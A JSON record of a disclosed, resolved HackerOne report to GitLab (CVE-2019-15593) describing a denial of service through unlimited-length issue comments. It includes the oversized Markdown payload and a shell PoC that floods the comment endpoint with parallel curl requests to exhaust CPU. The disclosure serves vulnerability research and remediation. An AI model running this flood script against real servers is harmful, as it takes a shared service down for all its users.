{
  "id": 557154,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NTcxNTQ=",
  "url": "https://hackerone.com/reports/557154",
  "title": "DoS attack via comment on Issue",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2019-04-30T17:59:37.266Z",
  "submitted_at": "2019-04-30T17:59:37.266Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "8ayac",
    "url": "/8ayac",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/266/369/5dc3ed65f4f281d1710a1728d46e13dc3c7db062_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-15593"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-11-21T14:27:05.916Z",
  "bug_reporter_agreed_on_going_public_at": "2019-11-07T06:57:30.778Z",
  "team_member_agreed_on_going_public_at": "2019-11-21T14:27:05.796Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\nThere is no limit to the number of characters in the issue comments, which allows a DoS attack. The DoS attack affects both server-side and client-side.\n\n**NOTE**: This bug happens on GitLab.com.\n\n### Steps to reproduce\n▼Attack for Client-side \n1. Sign in to GitLab.\n2. Create a project as below:\n    - Project name: test01\n    - Project slug: test01\n    - Visibility Level: Public\n    - Initialize repository with README: Checked\n3. Create a new issue for the project created in Step 2.\n4. Post some comments on the Issue created in Step 3.\n5. Post a comment as below:\n`[a](/a/a/a/a/a/a/a/a/a/a/a/a/a/a.....(50000 times))`\n6. Reload the Issue page.\n\nResult: I received an error message \"Something went wrong while fetching comments. Please try again.\" And I could not fetch all the comments.\n\nNote: In Step 5, if you can not post the comment from the browser, send the HTTP request directly in some way.\nNote: The string to post in step 5 is described in the attached file F481358.\n\n- PoC movie: F481363\n\n▼Attack for Server-side\nAn attacker can exhaust server resources by continuously sending the requests generated in Step 5 of [Attack for Client-side]. This causes a denial of service to all users.\n\nFor example, you can verify it with a script as below:\n```sh\n#!/bin/sh\ncharBlock=$(head -c 50000 /dev/zero | sed -e 's/\\x00/\\/a/g')\npayload='[a]('$charBlock')'\n\ngitlabHost=$1\nProjectURL=$2\ntargetID=$3\nloop=$4\n\ncurl=`cat << EOS\ncurl\n  --insecure\n  --silent\n  --output /dev/null\n  ${ProjectURL}/notes?target_id=${targetID}\\&target_type=issue\n  --header 'Host: ${gitlabHost}'\n  --header 'X-CSRF-Token: [PLACEHOLDER]'\n  -b '_gitlab_session=[PLACEHOLDER]'\n  --data-binary 'note%5Bnoteable_type%5D=Issue&note%5Bnoteable_id%5D=3&note%5Bnote%5D=${payload}&merge_request_diff_head_sha=undefined'\nEOS`\n\nfor i in `seq ${loop}`\ndo\n    eval ${curl}&\ndone\n```\n\nRun the above script with the following command to see that the server's CPU is exhausted.\n```\n$ ./poc.sh [GitLab host] [Project URL] [target ID(※1)] [Repeat count of request]\n```\n※1: Get from the request generated in step 5 of [Client-side attack].\n\n- PoC movie:  F481365 \n\n\n#### Results of GitLab environment info\n```\nSystem information\nSystem:\nCurrent User:   git\nUsing RVM:      no\nRuby Version:   2.5.3p105\nGem Version:    2.7.6\nBundler Version:1.17.3\nRake Version:   12.3.2\nRedis Version:  3.2.12\nGit Version:    2.18.1\nSidekiq Version:5.2.5\nGo Version:     unknown\n\nGitLab information\nVersion:        11.10.2\nRevision:       f3e84e78b62\nDirectory:      /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:     PostgreSQL\nDB Version:     9.6.11\nURL:            https://gitlab.example.com\nHTTP Clone URL: https://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:  git@gitlab.example.com:some-group/some-project.git\nUsing LDAP:     no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:        9.0.0\nRepository storage paths:\n- default:      /var/opt/gitlab/git-data/repositories\nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\nGit:            /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\n### Impact for client-side \nAll comments on Issue will be inaccessible.\n\n### Impact for server-side:\nThe CPU is exhausted and users will be able to access the GitLab service.\n\nNOTE: All users who can comment on the issue can exploit this vulnerability.",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 48,
    "name": "Uncontrolled Resource Consumption"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 481358,
      "file_name": "payload.txt",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/481/358/48755da12a9db0c05dae266410c49519411b29d7/payload.txt?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T132043Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a45c0cc0a4695c763583223e7db364229dc0363749fd7ca001ab2dbc49e2d014",
      "file_size": 100005,
      "type": "text/plain",
      "moderated": null
    },
    {
      "id": 481363,
      "file_name": "poc1.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/481/363/2b1c98c6a2e5559d4f84f8960099a3d90cc48efc/poc1.mp4?response-content-disposition=attachment%3B%20filename%3D%22poc1.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc1.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T132043Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0bc741f49d20d818e2db4c800d6e3ca94f163c0845b10cfbe53f7cd0d7655182",
      "file_size": 90092231,
      "type": "video/mp4",
      "moderated": null
    },
    {
      "id": 481365,
      "file_name": "poc2.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/481/365/a11cd1f587cef176913d1f751e58a610e371c2bf/poc2.mp4?response-content-disposition=attachment%3B%20filename%3D%22poc2.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc2.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T132043Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7655852a154403af26bc6dedaa1368eabbd7edf4efc21db762f389da07c20ed8",
      "file_size": 247941882,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 82,
  "voters": [
    "m4t35z",
    "nnxxrr",
    "devploit",
    "n1m0",
    "manuelz120",
    "foobar7",
    "base_64",
    "ali",
    "sameerphad72",
    "not_stoppable",
    "and 72 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
